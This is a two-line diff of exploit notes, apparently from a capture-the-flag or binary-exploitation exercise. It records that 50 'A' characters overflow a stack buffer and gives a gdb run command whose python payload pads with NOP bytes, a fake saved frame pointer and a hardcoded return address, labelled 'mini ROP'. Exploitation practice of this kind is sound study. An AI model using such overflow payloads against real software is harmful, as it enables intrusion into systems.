@@ -1,0 +1,2 @@
+50 * A -> stack overflow win
+r <<< $(python -c "print '\x90' * 62 + 'SEBP' + '\x46\x85\x04\x08'"), mini ROP,  Kévin PETTA
